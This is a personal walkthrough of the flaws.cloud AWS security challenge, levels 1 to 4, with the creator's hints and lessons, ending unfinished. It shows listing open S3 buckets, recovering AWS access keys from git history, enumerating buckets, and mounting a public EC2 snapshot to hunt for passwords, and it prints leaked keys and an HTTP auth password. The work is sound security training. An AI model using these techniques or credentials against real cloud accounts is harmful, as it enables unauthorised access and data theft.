# Write up for flaws.cloud by Scott Piper - Hacking the cloud
> Scott Piper created this challenge and therefore all credits (including the screenshots he/I made) should go to him.<br>
I am thankful Scott created this challenge and I was able to practice with it, especially the explanations after solving a level to have better understanding of where the misconfiguration(s) occured.<br>

> Personal note: I tried to do the exercises without using the hints and only included them after I solved a level, but in some cases I did need the hints to get further.<br>
To avoid any spoilers, hints are closed by default, but available if you need them.<br>
Try to solve the levels without the hints in order to have the biggest learning effect :-)

### Requirements
Create an AWS S3 account (free)<br>
Install aws s3 cli<br>
&emsp;`$ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"`<br>
&emsp;`$ unzip awscliv2.zip`<br>
&emsp;`$ sudo ./aws/install`<br>

## Level 1
### Description
Through a series of levels you'll learn about common mistakes and gotchas when using Amazon Web Services (AWS). There are no SQL injection, XSS, buffer overflows, or many of the other vulnerabilities you might have seen before. As much as possible, these are AWS specific issues.

A series of hints are provided that will teach you how to discover the info you'll need. If you don't want to actually run any commands, you can just keep following the hints which will give you the solution to the next level. At the start of each level you'll learn how to avoid the problem the previous level exhibited.

Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud. 

This level is *buckets* of fun. See if you can find the first sub-domain.

<details closed>
<summary>Level 1: Hint 1</summary>

The site flaws.cloud is hosted as an S3 bucket. This is a great way to host a static site, similar to hosting one via github pages. Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is you could create a bucket named apple.com and Apple would never be able host their main site via S3 hosting.

You can determine the site is hosted as an S3 bucket by running a DNS lookup on the domain, such as:

dig +nocmd flaws.cloud any +multiline +noall +answer<br>
\# Returns:<br>
\# flaws.cloud.            5 IN A  54.231.184.255<br>

Visiting 54.231.184.255 in your browser will direct you to https://aws.amazon.com/s3/

So you know flaws.cloud is hosted as an S3 bucket.

You can then run:

nslookup 54.231.184.255<br>
\# Returns:<br>
\# Non-authoritative answer:<br>
\# 255.184.231.54.in-addr.arpa     name = s3-website-us-west-2.amazonaws.com

So we know it's hosted in the AWS region us-west-2

Side note (not useful for this game): All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. In this case, flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/

What will help you for this level is to know its permissions are a little loose.
</details>

<details closed>
<summary>Level 1: Hint 2</summary>
You now know that we have a bucket named `flaws.cloud` in `us-west-2`, so you can attempt to browse the bucket by using the aws cli by running:

`aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2`

If you happened to not know the region, there are only a dozen regions to try. You could also use the GUI tool cyberduck to browse this bucket and it will figure out the region automatically.

Finally, you can also just visit http://flaws.cloud.s3.amazonaws.com/ which lists the files due to the permissions issues on this bucket.

Want to just know how to get to the next level without running these tools?
</details>
<details closed>
<summary>Level 1: Hint 3 - solution</summary>
At this point, you should have found a file that will tell you to go to the sub-domain http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
</details>

### My solution Level 1
Find out if flaws.cloud is using AWS S3
When resolving the flaws.cloud with nslookup, it will provide multiple ip addresses<br>
`$ nslookup flaws.cloud`
```
Non-authoritative answer:
Name:	flaws.cloud
Address: 52.218.128.127
Name:	flaws.cloud
Address: 52.92.178.75
Name:	flaws.cloud
Address: 52.92.211.123
Name:	flaws.cloud
Address: 52.218.208.211
Name:	flaws.cloud
Address: 52.92.133.171
Name:	flaws.cloud
Address: 52.92.195.115
Name:	flaws.cloud
Address: 52.92.137.171
Name:	flaws.cloud
Address: 52.92.212.91
```
By performing another nslookup on the IP address, it will perform a reverse domain lookup `$ nslookup 52.218.128.127`
```
127.128.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
```
Now we know for sure, flaws.cloud is hosted in a S3 bucket on AWS<br>
With AWS command line, we can navigate to flaws.cloud and use certain commands<br>
To see what files are at flaws.cloud `$ aws s3 ls s3://flaws.cloud --no-sign-request`
> --no-sign-request is needed to avoid checking for credentials
```
2017-03-14 04:00:38       2575 hint1.html
2017-03-03 05:05:17       1707 hint2.html
2017-03-03 05:05:11       1101 hint3.html
2020-05-22 20:16:45       3162 index.html
2018-07-10 18:47:16      15979 logo.png
2017-02-27 02:59:28         46 robots.txt
2017-02-27 02:59:30       1051 secret-dd02c7c.html
```
There is a file secret-dd02c7c.html file<br>
Download the file to the local machine `$ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html ./ --no-sign-request`
```
download: s3://flaws.cloud/secret-dd02c7c.html to ./secret-dd02c7c.html
```
Open the file `$ open secret-dd02c7c.html`
As it is an html file, the file will automatically open in the default browser, showing the secret file has been found and giving access to the second level!

![alt text](https://github.com/8r0wn13/flAWS/blob/main/images/level2.png?raw=true)

#### Lesson learned
On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. A number of people accidentally open them up with permissions that are too loose. Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings.

##### Examples of this problem
&emsp;Directory listing of S3 bucket of Legal Robot (link) and Shopify (link).
&emsp;Read and write permissions to S3 bucket for Shopify again (link) and Udemy (link). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem. 

#### Avoiding the mistake
By default, S3 buckets are private and secure when they are created. To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, which is fine if you plan to publicly host the bucket as a web page. But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions. 

![alt text](https://github.com/8r0wn13/flAWS/blob/main/images/everyone.png?raw=true)

"Everyone" means everyone on the Internet. You can also list the files simply by going to http://flaws.cloud.s3.amazonaws.com/ due to that List permission.

## Level 2
### Description
The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

<details closed>
<summary>Level 2: Hint 1</summary>
You need your own AWS key, and you need to use the AWS CLI. Similar to the first level, you can discover that this sub-domain is hosted as an S3 bucket with the name "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud".

Its permissions are too loose, but you need your own AWS account to see what's inside. Using your own account you can run:

`aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`
</details>
<details closed>
<summary>Level 2: Hint 2 - solution</summary>
The next level is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
</details>

### My solution Level 2
When looking at the address provided after solving level 1 we get an AccessDenied message
`$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request`
```
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```
This means, the address cannot be accessed anonymous like in level 1 and a valid AWS is required
Try to do the same but your AWS account `$ aws s3 ls --profile <<s3 username>> s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`
```
2017-02-27 03:02:15      80751 everyone.png
2017-03-03 04:47:17       1433 hint1.html
2017-02-27 03:04:39       1035 hint2.html
2017-02-27 03:02:14       2786 index.html
2017-02-27 03:02:14         26 robots.txt
2017-02-27 03:02:15       1051 secret-e4443fc.html
```
It shows a secret-e4443fc.html file<br>
Download this file `$ aws s3 cp --profile <<s3 username>> s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html ./`
Open the file `open secret-e4443fc.html`

![alt text](https://github.com/8r0wn13/flAWS/blob/main/images/level3.png?raw=true)

#### Lesson learned
On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. A number of people accidentally open them up with permissions that are too loose. Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings.

##### Examples of this problem
&emsp;Directory listing of S3 bucket of Legal Robot (link) and Shopify (link).
&emsp;Read and write permissions to S3 bucket for Shopify again (link) and Udemy (link). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem. 

#### Avoiding the mistake
By default, S3 buckets are private and secure when they are created. To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, which is fine if you plan to publicly host the bucket as a web page. But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions. 

![alt text](https://github.com/8r0wn13/flAWS/blob/main/images/authenticated_users.png?raw=true)

"Everyone" means everyone on the Internet. You can also list the files simply by going to http://flaws.cloud.s3.amazonaws.com/ due to that List permission. 

## Level 3
### Description
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

<details closed>
<summary>Level 3: Hint 1</summary>
Like the first level, you should have figured out how to list the files in this directory, and seen that listing in this bucket is open to "Everyone". See the file listing at level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com/

This S3 bucket has a .git file. There are probably interesting things in it. Download this whole S3 bucket using:

`aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2`
</details>
<details closed>
<summary>Level 3: Hint 2</summary>
People often accidentally add secret things to git repos, and then try to remove them without revoking or rolling the secrets. You can look through the history of a git repo by running:

`git log`

Then you can look at what a git repo looked like at the time of a commit by running:

`git checkout f7cebc46b471ca9838a0bdd1074bb498a3f84c87`

where `f7cebc46b471ca9838a0bdd1074bb498a3f84c87` would be the hash for the commit shown in `git log`.
</details>
<details closed>
<summary>Level 3: Hint 3</summary>
You should have found the AWS key and secret. You can configure your aws command to use it and create a profile for it using:

`aws configure --profile flaws`

Then to list S3 buckets using that profile run:

`aws --profile flaws s3 ls`
</details>
<details closed>
<summary>Level 3: Hint 4 - Solution</summary>
The next level is at http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
</details>

### My solution Level 3
We giving the following command `$ aws s3 ls --profile dennis s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/` it will return:
```
                           PRE .git/
2017-02-27 01:14:33     123637 authenticated_users.png
2017-02-27 01:14:34       1552 hint1.html
2017-02-27 01:14:34       1426 hint2.html
2017-02-27 01:14:35       1247 hint3.html
2017-02-27 01:14:33       1035 hint4.html
2020-05-22 20:21:10       1861 index.html
2017-02-27 01:14:33         26 robots.txt
```
There is no secret file, however there is a .git file<br>
Git is used for versioning and it can be that keys were used in previous versions.<br>
All history can be synced instead of copied as done before:<br>
`$ aws s3 sync --profile dennis s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ ./level3`

Go to directory to the git directory `$ cd level3/.git` and type `$ tree`<br>
![alt text](https://github.com/8r0wn13/flAWS/blob/main/images/tree.png?raw=true)

We can go through all of the files manually, but we can also guess based on logic.<br>
Git uses has a master branch and can have sub-branches<br>
In `log/refs/heads` there is a master file, hence read that file `$ cat logs/refs/heads/master`
```
0000000000000000000000000000000000000000 f52ec03b227ea6094b04e43f475fb0126edb5a61 0xdabbad00 <scott@summitroute.com> 1505661007 -0600	commit (initial): first commit
f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 0xdabbad00 <scott@summitroute.com> 1505661043 -0600	commit: Oops, accidentally added something I shouldn't have
````
The second line shows that the developer "accidentitally added something he/she shouldn't have", hence this is commit can be interesting.<br>
`f52ec03b227ea6094b04e43f475fb0126edb5a61` is the hash for that commit and which can be checked out `$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61`<br>
This command shows the code from the past `$ ls`
```
access_keys.txt          hint1.html  hint3.html  index.html
authenticated_users.png  hint2.html  hint4.html  robots.txt
```
Now there is a new file `access_keys.txt`. Read that file `$ cat access_keys.txt`
```
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```
These are access keys, which make it possible to access the application as the user connected to these access keys.<br>
Create a new profile `$ aws configure --profile unknown_user`
```
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]: 
Default output format [None]:
```
Now try to access the web page for level 3 again, with this newly created profile `$ aws s3 ls --profile unknown_user s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud`
```
                           PRE .git/
2017-02-27 01:14:33     123637 authenticated_users.png
2017-02-27 01:14:34       1552 hint1.html
2017-02-27 01:14:34       1426 hint2.html
2017-02-27 01:14:35       1247 hint3.html
2017-02-27 01:14:33       1035 hint4.html
2020-05-22 20:21:10       1861 index.html
2017-02-27 01:14:33         26 robots.txt
```
There is no difference with before.<br>
When no URL is provided with the aws s3 command, it wil list all buckets the unknown_user has access to `$ aws s3 ls --profile unknown_user`
```
2017-02-12 22:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 18:34:53 config-bucket-975426262029
2017-02-12 21:03:24 flaws-logs
2017-02-05 04:40:07 flaws.cloud
2017-02-24 02:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 19:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 19:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 20:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 20:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 21:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```
Above are all the s3 buckets the unknown_user has access to<br>
The goal is to get to level 4, hence open the link `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`


#### Lesson learned
People often leak AWS keys and then try to cover up their mistakes without revoking the keys. You should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.

##### Examples of this problem

&emsp;Instagram's Million Dollar Bug: In this must read post, a bug bounty researcher uncovered a series of flaws, including finding an S3 bucket that had .tar.gz archives of various revisions of files. One of these archives contained AWS creds that then allowed the researcher to access all S3 buckets of Instagram. For more discussion of how some of the problems discovered could have been avoided, see the post "Instagram's Million Dollar Bug": Case study for defense 

Another interesting issue this level has exhibited, although not that worrisome, is that you can't restrict the ability to list only certain buckets in AWS, so if you want to give an employee the ability to list some buckets in an account, they will be able to list them all. The key you used to discover this bucket can see all the buckets in the account. You can't see what is in the buckets, but you'll know they exist. Similarly, be aware that buckets use a global namespace meaning that bucket names must be unique across all customers, so if you create a bucket named `merger_with_company_Y` or something that is supposed to be secret, it's technically possible for someone to discover that bucket exists.

#### Avoiding this mistake
Always roll your secrets if you suspect they were compromised or made public or stored or shared incorrectly. Roll early, roll often. Rolling secrets means that you revoke the keys (ie. delete them from the AWS account) and generate new ones. 

## Level 4
### Description
For the next level, you need to get access to the web page running on an EC2 at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. 

<details closed>
<summary>Level 4: Hint 1</summary>
You can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but you'll need to find it.

To do this, first we need the account ID, which we can get using the AWS key from the previous level:

`aws --profile unknown_user sts get-caller-identity`

Using that command also tells you the name of the account, which in this case is named "backup". The backups this account makes are snapshots of EC2s. Next, discover the snapshot:

`aws --profile unknown_user ec2 describe-snapshots --owner-id 975426262029`

We specify the owner-id just to filter the output. For fun, run that command without the owner-id and notice all the snapshots that are publicy readable. By default snapshots are private, and you can transfer them between accounts securely by specifiying the account ID of the other account, but a number of people just make them public and forget about them it seems.

This snapshot is in us-west-2
You're going to want to look in that snapshot.
</details>
<details closed>
<summary>Level 4: Hint 2</summary>
Now that you know the snapshot ID, you're going to want to mount it. You'll need to do this in your own AWS account, which you can get for free.

First, create a volume using the snapshot:

`aws --profile YOUR_ACCOUNT ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89`

Now in the console you can create an EC2 (I prefer ubuntu, but any linux will do) in the us-west-2 region and in the storage options, choose the volume you just created.

SSH in with something like:

`ssh -i YOUR_KEY.pem  ubuntu@ec2-54-191-240-80.us-west-2.compute.amazonaws.com`

We'll need to mount this extra volume by running:
```
lsblk

# Returns:
#  NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
#  xvda    202:0    0   8G  0 disk
#  â””â”€xvda1 202:1    0   8G  0 part /
#  xvdb    202:16   0   8G  0 disk
#  â””â”€xvdb1 202:17   0   8G  0 part

sudo file -s /dev/xvdb1

# Returns:
#  /dev/xvdb1: Linux rev 1.0 ext4 filesystem data, UUID=5a2075d0-d095-4511-bef9-802fd8a7610e, volume name "cloudimg-rootfs" (extents) (large files) (huge files)

# Next we mount it

sudo mount /dev/xvdb1 /mnt
```
Now you can dig around in that snapshot.
</details>
<details closed>
<summary>Level 4: Hint 3</summary>
Once you've attached the volume, you'll want to look around for something that might tell you the password. Running some variant of `find /mnt -mtime -1` will help to find recent files, which you can filter further using:

`find /mnt -type f -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" | less`

That should show about 36 files that have changed to help narrow down your search. 
</details>
<details closed>
<summary>Level 4: Hint 4 - Solution</summary>
In the ubuntu user's home directory is the file: `/home/ubuntu/setupNginx.sh`

This creates the basic HTTP auth user:

`htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`

That is the username and password for the user. Enter those at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
</details>

### My solution Level 4
First the Account ID is needed:<br>
`aws --profile unknown_user sts get-caller-identity`
```
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```
With the user ID we can get a snapshot:<br>
`aws --profile unknown_user ec2 describe-snapshots --owner-id 975426262029`

The above command will return that a region needs to be specified:
```
You must specify a region. You can also configure your region by running "aws configure".
```
I was not able to figure out the region of the owner-id, but according to the hints it is us-west-2, hence:<br>
`aws --profile unknown_user ec2 describe-snapshots --owner-id 975426262029 --region us-west-2`
```
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}
```
This shows it is a snapshot with ID `snap-0b49342abd1bdcb89`<br>
Now the snapshot can be mounted with my own AWS account<br>
`aws --profile dennis ec2 create-volume --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89`
When running the above code it will mention that --availability-zone needs to be provided:<br>
```
aws: error: the following arguments are required: --availability-zone
```
This information is not given with the previous command and I didn't know where I could find it, hence I looked it up in hint 2.<br>
In the hint, it is using us-west-2a, but that didn't work for me either<br>
`aws --profile dennis ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89`

It provided the below error message:
```
An error occurred (UnauthorizedOperation) when calling the CreateVolume operation: You are not authorized to perform this operation. Encoded authorization failure message: zqQeOK6QmJCm8AxKWCnL-MviOAu7w39xYPHn10Tt_Ln-D3F7eMbk4qsDtF6mYJ7fV1xLitwz-8IBn-CrBa621nqJhzAFAkyxZw_msYXKysHHEMVXSLqZ9Hpd-CvvrsLBq8HCiBmJQO_5c3OjSXtI7SDUwA9kXY_9nqSXkYT_Y5MKtWNR20ulAjhLLiUufGj_VkYscubtAsrP92mtdWe1ZtoTVKgGDhhj1WDfvISCD1JM4ItvaDZIUTQ3IybeiAleVRdgfARKPQPdFrGXzFuxhQ4CcI9izIYSZa8ey8zSHrpNEfJF2dNIVJB0o32WDKrjFUFV9GH5vVCRfS0VacQ-UMs2mGHb5Q8wHukZcfDKzzlcyQMNRXJyTAUblcUX7_AKsNeJu3eScBjjpgMhVfkIOYAwAGDRuTpbmRf36dWBkmiEf_FhN3XV7W-VKsz4MEMdG9d_hizy90w3nENGdgMZWFYVcQ0pmaCPAsRNFyxYsFY5Zl23-ey2ljQ76_K09gqrfXIhDtXznsgnPQu6YkjPAma-zU4e6KzJAmjOmM5YD5vt_JGBfjnUStPeY8Q1tAPtyJQBhrf5nTCd2qFmH6tKVwwwgpZlcM4ZRUeq2IY_n6qtLP1lGW9FYtbMAokAq-ipvfM
```
When looking in the AWS portal, it seemed that availability zones are provided for an account, hence this is something what needs to be looked up I guess<br>
I couldn't get this to work for some reason, either the above error message or the availability zone doesn't exist<br>
Looking in hint 2, the next step would be to create an EC2 instance in AWS<br>
When donwloading the *.pem file, I got every time that the following error message:
```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'level4_1.pem' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "level4.pem": bad permissions
ubuntu@ec2-52-90-5-57.compute-1.amazonaws.com: Permission denied (publickey).
```
It needs to have r/w or r access only for this user:<br>
`sudo chmode 600 level4.pem`
Running the following command will log into the EC2 instance from the local machine:<br>
`ssh -i level4.pem ubuntu@ec2-52-90-5-57.compute-1.amazonaws.com`
```
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1025-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  1 23:18:14 UTC 2023

  System load:  0.0               Processes:             95
  Usage of /:   20.6% of 7.57GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 172.31.87.233
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```
Now the volume needs to be mounted to the EC2 instance:<br>
`sudo file -s /dev/xvda1 /mnt`<br>
`/sudo mount /dev/xvda1 /mnt`

Now the instance can be searched for passwords:<br>
```
/mnt/boot/grub/grubenv
/mnt/home/ubuntu/.ssh/authorized_keys
/mnt/home/ubuntu/.cache/motd.legal-displayed
/mnt/home/ubuntu/.sudo_as_admin_successful
/mnt/usr/share/netplan/netplan/__pycache__/__init__.cpython-310.pyc
/mnt/usr/share/netplan/netplan/__pycache__/_features.cpython-310.pyc
/mnt/usr/share/netplan/netplan/__pycache__/configmanager.cpython-310.pyc
/mnt/usr/share/netplan/netplan/__pycache__/libnetplan.cpython-310.pyc
/mnt/usr/share/netplan/netplan/__pycache__/terminal.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/__pycache__/__init__.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/__pycache__/ovs.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/__pycache__/utils.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/__pycache__/sriov.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/__pycache__/core.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/__init__.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/generate.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/ip.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/migrate.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/info.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/get.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/set.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/apply.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/try_command.cpython-310.pyc
/mnt/usr/share/netplan/netplan/cli/commands/__pycache__/sriov_rebind.cpython-310.pyc
/mnt/etc/passwd
/mnt/etc/group
/mnt/etc/machine-id
/mnt/etc/shadow
/mnt/etc/passwd-
/mnt/etc/gshadow
/mnt/etc/hostname
/mnt/etc/shadow-
/mnt/etc/ssh/ssh_host_dsa_key.pub
/mnt/etc/ssh/ssh_host_ed25519_key.pub
/mnt/etc/ssh/ssh_host_ed25519_key
/mnt/etc/ssh/ssh_host_dsa_key
/mnt/etc/ssh/ssh_host_ecdsa_key.pub
/mnt/etc/ssh/ssh_host_ecdsa_key
/mnt/etc/ssh/ssh_host_rsa_key
/mnt/etc/ssh/ssh_host_rsa_key.pub
/mnt/etc/netplan/50-cloud-init.yaml
/mnt/etc/subuid
/mnt/etc/subgid
/mnt/etc/apt/sources.list
```
There should be a file `/home/ubuntu/setupNginx.sh` which should provide a username and password for (which is not, hence I did something wrong)


<<To_Be_Continued>>
